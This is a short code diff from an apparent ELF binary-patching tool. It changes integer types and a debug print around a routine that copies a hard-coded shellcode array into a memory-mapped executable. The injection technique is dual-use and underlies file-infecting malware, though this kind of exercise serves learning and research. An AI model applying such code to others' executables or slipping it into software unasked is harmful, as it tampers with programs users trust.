@@ -21,9 +21,9 @@ unsigned char shellcode[] = {0xbb, 0x00, 0x00, 0x00, 0x00, 0xb9, 0x00, 0x00, 0x0
 	0x48, 0x83, 0xfb, 0x0a, 0x7c, 0xec, 0xb8, 0x3c, 0x00, 0x00, 0x00, 0x48, 0x89, \
 	0xcf, 0x0f, 0x05};
 
-off_t get_size(off_t size) // returns the size of the file if used with GET and sets up the size otherwise
+size_t get_size(size_t size) // returns the size of the file if used with GET and sets up the size otherwise
 {
-	static off_t var = 0;
+	static size_t var = 0;
 	if (var != GET)
 		var = size;
 	return var;
@@ -222,7 +222,7 @@ void	inject_new_header(void *map)
 	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)map;
 	Elf64_Shdr *shdr = (Elf64_Shdr *)(map + ehdr->e_shoff);
 
-	printf("This is the size%lu", get_size(GET));
+	printf("This is the size%lu\n", get_size(GET));
 	off_t shellcode_offset = get_size(GET) - sizeof(shellcode) - 65;
 	memcpy(map + shellcode_offset, shellcode, sizeof(shellcode));
 
